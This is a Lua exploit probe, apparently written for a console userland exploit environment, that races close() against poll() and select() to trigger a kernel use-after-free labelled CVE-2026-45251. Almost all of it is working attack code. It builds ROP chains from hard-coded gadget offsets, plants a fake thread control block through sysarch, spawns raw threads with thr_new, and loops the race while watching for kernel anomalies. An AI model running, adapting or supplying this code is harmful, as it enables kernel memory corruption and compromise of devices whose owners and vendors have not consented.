-- CRASH_CLASS: MODERATE
-- PROBE 93e2: CVE-2026-45251 poll/select close race UAF
--
-- Race: main thread blocks in poll(209) on a socket fd,
-- child thread closes that fd via ROP.
-- If the file object is freed while poll holds a dangling pointer,
-- the wakeup touches freed memory.
--
-- Strategy:
-- 1. Create socketpair (gives us two fds)
-- 2. Spawn child thread that sleeps briefly then closes fd0
-- 3. Main thread calls poll(fd0, POLLIN, timeout=1000ms)
-- 4. Check if poll returns anomalous values or if we get kernel pointers

print("=== PROBE 93e2: POLL/CLOSE RACE (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Get eboot base for gadgets
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

-- Gadget addresses
local par_lo, par_hi = eoff(0x992)      -- pop rax; ret
local pdr_lo, pdr_hi = eoff(0xC9DFE)    -- pop rdi; ret
local psr_lo, psr_hi = eoff(0xD77D)     -- pop rsi; ret
local prdx_lo, prdx_hi = eoff(0x3B02D7) -- pop rdx; ret
local prc_lo, prc_hi = eoff(0xE64)      -- pop rcx; ret
local pr8_lo, pr8_hi = eoff(0x991)      -- pop r8; ret
local bret_lo, bret_hi = eoff(0x42)     -- ret
local mwr_lo, mwr_hi = eoff(0x92C67)    -- mov [rdi], rax; ret
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    -- Setup fake TCB
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)

    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end

    -- sysarch(SET_FSBASE=129, &fake_tcb)
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)  -- sysarch
    put(stub_lo, stub_hi)

    -- Execute the syscall calls
    for _, c in ipairs(calls) do
        local a1_lo, a1_hi = split(c[2] or 0)
        local a2_lo, a2_hi = split(c[3] or 0)
        local a3_lo, a3_hi = split(c[4] or 0)
        put(pdr_lo, pdr_hi); put(a1_lo, a1_hi)
        put(psr_lo, psr_hi); put(a2_lo, a2_hi)
        put(prdx_lo, prdx_hi); put(a3_lo, a3_hi)
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end

    -- Write done marker
    put(par_lo, par_hi); put(0xD09E93E2, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)

    -- thr_exit(431)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)

    -- thr_new param
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- ======== RACE LOOP ========
print("--- Poll/Close Race ---")

local anomalies = 0
local iterations = 50

for iter = 1, iterations do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Create socketpair
    local sv = memory.alloc(16)
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    local ok_sp, rv_sp = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), sv) -- AF_UNIX, SOCK_DGRAM
    end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv) + 4) or -1

    if fd0 < 0 or fd1 < 0 then
        print(string.format("  iter %d: socketpair failed", iter))
        break
    end

    -- Spawn child that will close fd0 after a tiny delay
    -- Child: nanosleep(0, 500000) then close(fd0)
    -- We use a busy-wait style: child does close immediately
    local done = memory.alloc(8); wd(N(done), 0)
    local calls = {
        {6, fd0},  -- close(fd0)
    }
    local spawned = spawn_child(calls, N(done))

    if spawned then
        -- Main thread: poll(fd0, POLLIN, timeout=100ms)
        -- struct pollfd: { int fd; short events; short revents; } = 8 bytes
        local pollfd = memory.alloc(16)
        wd(N(pollfd), fd0)           -- fd
        wd(N(pollfd) + 4, 0x0001)    -- events=POLLIN, revents=0

        local ok_p, rv_p = pcall(function()
            return mk(209)(uint64(N(pollfd)), uint64(1), uint64(100))
        end)
        local poll_ret = ok_p and N(rv_p) or -999
        if poll_ret >= 0x80000000 then poll_ret = poll_ret - 0x100000000 end

        local revents = rd(N(pollfd) + 4) or 0
        -- revents is in high 16 bits of the dword at +4
        local rev_hi = math.floor(revents / 0x10000) % 0x10000

        -- Wait for child
        for w = 1, 100000 do
            if (rd(N(done)) or 0) ~= 0 then break end
        end

        if poll_ret ~= 0 and poll_ret ~= -1 then
            anomalies = anomalies + 1
            print(string.format("  iter %d: poll=%d revents=0x%04X ANOMALY!", iter, poll_ret, rev_hi))
        elseif rev_hi ~= 0 and rev_hi ~= 0x0020 then
            -- 0x0020 = POLLNVAL (expected when fd closed)
            anomalies = anomalies + 1
            print(string.format("  iter %d: poll=%d revents=0x%04X UNEXPECTED!", iter, poll_ret, rev_hi))
        end
    end

    -- Clean up fd1
    pcall(function() mk(6)(uint64(fd1)) end)
    -- fd0 already closed by child (or us)
end

print(string.format("races=%d anomalies=%d", iterations, anomalies))

-- ======== SECTION B: select/close race ========
print("")
print("--- Select/Close Race ---")

local sel_anomalies = 0
local sel_iters = 50

for iter = 1, sel_iters do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16)
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    local ok_sp, rv_sp = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), sv)
    end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv) + 4) or -1
    if fd0 < 0 or fd1 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    local calls = { {6, fd0} }
    local spawned = spawn_child(calls, N(done))

    if spawned then
        -- select(fd0+1, &readfds, NULL, NULL, &timeout)
        -- fd_set is 128 bytes (FD_SETSIZE/8). Set bit for fd0.
        local readfds = memory.alloc(128)
        for i = 0, 124, 4 do wd(N(readfds) + i, 0) end
        -- Set bit fd0: byte = fd0/8, bit = fd0%8
        local byte_off = math.floor(fd0 / 8)
        local bit_off = fd0 % 8
        wd(N(readfds) + byte_off, math.floor(2^bit_off))

        -- timeval: {tv_sec=0, tv_usec=100000} (100ms)
        local tv = memory.alloc(16)
        wq(N(tv), uint64(0))         -- tv_sec
        wq(N(tv) + 8, uint64(100000)) -- tv_usec

        local ok_s, rv_s = pcall(function()
            return mk(93)(uint64(fd0 + 1), uint64(N(readfds)),
                uint64(0), uint64(0), uint64(N(tv)))
        end)
        local sel_ret = ok_s and N(rv_s) or -999
        if sel_ret >= 0x80000000 then sel_ret = sel_ret - 0x100000000 end

        for w = 1, 100000 do
            if (rd(N(done)) or 0) ~= 0 then break end
        end

        if sel_ret ~= 0 and sel_ret ~= -1 then
            sel_anomalies = sel_anomalies + 1
            print(string.format("  iter %d: select=%d ANOMALY!", iter, sel_ret))
        end
    end

    pcall(function() mk(6)(uint64(fd1)) end)
end

print(string.format("sel_races=%d sel_anomalies=%d", sel_iters, sel_anomalies))

print("")
print("alive=" .. tostring(alive()))
print("=== 93e2 COMPLETE ===")
